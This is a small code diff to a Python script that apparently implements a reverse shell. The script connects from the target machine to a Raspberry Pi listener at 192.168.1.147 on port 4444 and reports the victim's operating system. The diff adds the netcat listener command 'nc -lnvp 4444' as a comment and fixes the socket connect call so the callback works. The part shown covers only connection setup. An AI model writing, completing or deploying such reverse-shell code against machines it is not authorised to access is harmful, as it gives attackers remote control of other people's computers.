@@ -7,6 +7,7 @@ import os
 SERVER_HOST = '192.168.1.147'  
 #Port listening on the Raspberry Pi
 SERVER_PORT = 4444    
+# In the raspberry pi: nc -lnvp 4444
 
 
 def perform_task_reverse_shell():
@@ -14,7 +15,7 @@ def perform_task_reverse_shell():
     try:
         #Creation of the socket and connection to the server (RPI)
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect(SERVER_HOST, SERVER_PORT)
+        client.connect((SERVER_HOST, SERVER_PORT))
 
         #First message:
         client.send(f"[*] Established connection from {os.name}\n".encode())
